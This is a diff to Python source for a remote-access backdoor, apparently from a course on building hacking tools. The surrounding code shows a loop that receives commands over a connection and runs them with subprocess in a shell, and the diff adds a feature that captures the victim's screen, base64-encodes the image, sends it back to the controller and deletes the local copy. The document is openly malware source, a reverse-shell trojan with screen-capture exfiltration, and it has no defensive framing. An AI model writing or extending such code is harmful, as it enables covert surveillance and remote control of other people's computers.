@@ -8,6 +8,8 @@ import shutil
 import sys
 import base64
 import requests
+import ctypes
+from mss import mss
 
 def reliable_send(data):
 	json_data = json.dumps(data)
@@ -21,6 +23,10 @@ def reliable_recv():
 			return json.loads(json_data)
 		except ValueError:
 			continue
+			
+def screenshot():
+	with mss() as screenshot:
+		screenshot.shot()
 			
 def download(url):
 	get_response = requests.get(url)
@@ -66,6 +72,15 @@ def shell():
 				reliable_send("[+] Started!")
 			except:
 				reliable_send("[!!] Failed To Start")
+		elif command[:10] == "screenshot":
+			try:
+				screenshot()
+				with open("monitor-1.png", "rb") as sc:
+					reliable_send(base64.b64encode(sc.read()))
+				os.remove("monitor-1.png")
+			except:
+				reliable_send("[!!] Failed To Take Screenshot")
+				
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
